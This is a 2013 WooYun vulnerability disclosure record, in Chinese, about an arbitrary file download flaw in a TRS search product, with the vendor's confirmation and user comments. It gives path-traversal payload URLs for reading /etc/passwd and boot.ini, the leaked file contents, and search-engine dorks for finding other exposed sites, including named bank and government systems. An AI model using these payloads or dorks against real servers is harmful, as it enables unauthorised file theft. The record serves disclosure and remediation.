{"id": 6687, "wybug_id": "wooyun-2013-040047", "wybug_title": "trs某系统任意文件下载漏洞第二弹", "wybug_corp": "北京拓尔思信息技术股份有限公司", "wybug_author": "想要减肥的胖纸", "wybug_date": "2013-10-17 14:37", "wybug_open_date": "2014-01-15 14:37", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向公众公开  简要描述： 感觉挺严重的问题，存在的地方包括但是不局限银行、政府等行业。 详细说明：  expinforadar/jsp/util/file_download.jsp?filePath=../../../../../../../etc/passwdexp2http://inforadar.trs.com.cn/jsp/util/file_download.jsp?filePath=c:%5Cboot.ini%00.xml官方网站需要加个截断，就可以了应该是神马雷达系统。很多地方都有这问题。但是google找不到多少个，因为很多都是二次开发，目录明改变了。比如招行。。。 WooYun: 招商银行某系统任意文件下载漏洞 googlehttp://203.208.46.145/#newwindow=1&q=intitle:trs+inurl:inforadar&start=10http://203.208.46.145/#filter=0&newwindow=1&q=inurl:jsp/portalsearchbaiduhttp://www.baidu.com/s?wd=inurl%3Ainforadar&rsv_spt=1&issp=1&rsv_bp=0&ie=utf-8&tn=baiduhome_pg&rsv_sug3=13&rsv_sug=0&rsv_sug1=12&rsv_sug4=777   漏洞证明：   WooYun: 招商银行某系统任意文件下载漏洞  WooYun: 福建省人民政府某系统任意文件下载漏洞 trs官方\n[boot loader]timeout=30default=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS[operating systems]multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS=\"Windows Server 2003, Enterprise\" /noexecute=optout /fastdetect\n貌似windows的boot.ini都一样 官方用的是2003系统。。   修复方案：  正则过滤下呗，然后限制下访问文件类型。   版权声明：转载请注明来源 想要减肥的胖纸@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2013-10-18 09:29 厂商回复： 感谢您的支持，该漏洞在产品的前一版本已经修复，相关应用系统及用户单位我们会及时核查更新。*** 安全无止境，我们一直在努力！ *** 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-17 15:50 |    \t\tcyber_jt \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:14        | goventkiller)\t\t \n  关注，这几天遇到很多TRS系统。    \n     2013-10-17 19:29 |    \t\t鶆鶈 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:30        )\t\t \n  mof,moc,fmprc...求日~哦也!    \n     2013-10-17 21:57 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  @鶆鶈 www.gov.cn 求日    \n     2013-10-18 11:46 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  trs给的rank太低了。唉。    \n     2013-10-18 12:35 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  或许是出于商业目的，担心被竞争对手恶意诋毁，所以产品再严重的问题，也不能“自乱阵脚”给一个高的rank值，授人以“把柄”。不过@鶆鶈 @想要减肥的胖纸 “厂商活动”里面不是给你们发送礼物了么，或许可以平衡rank比较低的问题吧。*** 安全无止境，我们一直在努力！ ***希望后半句如果能够做的实际一点    \n     2013-10-18 12:35 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  或许是出于商业目的，担心被竞争对手恶意诋毁，所以产品再严重的问题，也不能“自乱阵脚”给一个高的rank值，授人以“把柄”。不过@鶆鶈 @想要减肥的胖纸 “厂商活动”里面不是给你们发送礼物了么，或许可以平衡rank比较低的问题吧。*** 安全无止境，我们一直在努力！ ***希望后半句如果能够做的实际一点    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}